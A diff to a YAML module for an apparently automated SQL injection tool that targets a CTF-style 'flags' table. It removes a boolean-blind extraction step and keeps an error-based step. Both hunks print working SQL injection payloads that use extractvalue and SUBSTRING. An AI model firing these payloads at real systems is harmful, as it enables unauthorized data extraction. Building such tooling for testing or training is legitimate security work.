@@ -6,7 +6,6 @@ author: system
 description: >
   Detects and exploits SQL injection via error-based, boolean-blind,
   time-based, and union-based techniques.
-
 tags:
   - sqli
   - sql-injection
@@ -94,15 +93,4 @@ exploitation:
           action: http_probe
           with:
             payload: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))--"
-            inject_into: vulnerable_param
-
-    - id: boolean_extract
-      name: "Boolean Blind Extraction"
-      requires_signal: boolean_based_confirmed
-      technique: boolean_blind
-      steps:
-        - id: blind_extract
-          action: blind_extract
-          with:
-            true_template: "' AND SUBSTRING((SELECT flag FROM flags),{pos},1)='{char}'--"
             inject_into: vulnerable_param
